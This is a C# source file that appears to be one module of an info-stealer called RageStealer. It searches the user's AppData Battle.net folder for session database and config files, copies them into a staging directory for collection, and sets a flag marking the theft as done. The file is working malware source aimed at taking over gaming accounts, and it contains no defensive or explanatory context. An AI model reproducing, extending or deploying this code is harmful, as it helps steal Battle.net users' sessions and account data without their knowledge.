using System;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Gaming;

internal sealed class BattleNet
{
	private static readonly string Path = System.IO.Path.Combine(Paths.Appdata, "Battle.net");

	public static bool GetBattleNetSession(string sSavePath)
	{
		if (!Directory.Exists(Path))
		{
			return false;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			string[] array = new string[2] { "*.db", "*.config" };
			foreach (string searchPattern in array)
			{
				string[] files = Directory.GetFiles(Path, searchPattern, SearchOption.AllDirectories);
				foreach (string fileName in files)
				{
					try
					{
						string text = null;
						FileInfo fileInfo = new FileInfo(fileName);
						if (fileInfo.Directory != null)
						{
							text = ((fileInfo.Directory != null && fileInfo.Directory.Name == "Battle.net") ? sSavePath : System.IO.Path.Combine(sSavePath, fileInfo.Directory.Name));
						}
						if (!Directory.Exists(text) && text != null)
						{
							Directory.CreateDirectory(text);
						}
						if (text != null)
						{
							fileInfo.CopyTo(System.IO.Path.Combine(text, fileInfo.Name));
						}
					}
					catch (Exception)
					{
						return false;
					}
				}
			}
			Counter.BattleNet = true;
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
